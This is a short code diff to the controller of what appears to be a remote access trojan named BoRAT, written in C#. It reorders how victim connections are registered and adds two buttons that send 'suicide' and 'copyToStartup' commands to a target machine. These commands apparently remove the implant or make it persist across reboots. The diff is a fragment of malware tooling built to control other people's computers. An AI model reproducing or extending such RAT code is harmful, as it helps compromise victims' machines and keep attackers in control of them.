@@ -129,14 +129,14 @@ namespace BoRAT.Server
                 return;
             }
 
+            // Add the connection to sockets list.
+            listSockets.Add(connection);
+
             // Count the sockets list.
             var id = listSockets.Count;
             // Create the command string for getInfo.
             var command = string.Format("getInfo~{0}", id);
 
-            // Add the connection to sockets list.
-            listSockets.Add(connection);
-            
             // Add the client id.
             AddClientID(id);
             // Update the status.
@@ -707,6 +707,16 @@ namespace BoRAT.Server
             rtbLog.SelectionStart = rtbLog.Text.Length;
             // Scroll the selection of the log.
             rtbLog.ScrollToCaret();
+        }
+
+        private void btnSuicide_Click(object sender, EventArgs e)
+        {
+            SendCommandToTarget("suicide");
+        }
+
+        private void btnCopyToStartup_Click(object sender, EventArgs e)
+        {
+            SendCommandToTarget("copyToStartup");
         }
     }
 }
